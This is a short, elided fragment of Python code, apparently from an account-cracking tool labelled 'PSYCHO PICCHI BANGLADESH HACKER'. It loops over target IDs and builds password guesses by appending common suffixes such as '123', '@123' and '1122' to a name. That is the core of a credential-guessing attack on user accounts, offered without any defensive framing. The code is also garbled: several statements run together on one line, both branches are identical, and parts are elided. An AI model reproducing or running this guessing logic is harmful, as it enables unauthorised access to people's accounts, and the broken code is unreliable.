                ...
                for zsb in self.id: # PSYCHO PICCHI BANGLADESH HACKER
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwv.append(frs+'12') pwv.append(frs+'123') pwv.append(frs+'1234') pwv.append(frs+'@123') pwv.append(frs+'@') pwv.append(frs+'@@') pwv.append(frs+'@@@') pwv.append(frs+'@#') pwv.append(frs+'1122') pwv.append(frs+'@12') pwv.append(frs+'111')
                        else:
                            pwv.append(frs+'12') pwv.append(frs+'123') pwv.append(frs+'1234') pwv.append(frs+'@123') pwv.append(frs+'@') pwv.append(frs+'@@') pwv.append(frs+'@@@') pwv.append(frs+'@#') pwv.append(frs+'1122') pwv.append(frs+'@12') pwv.append(frs+'111')
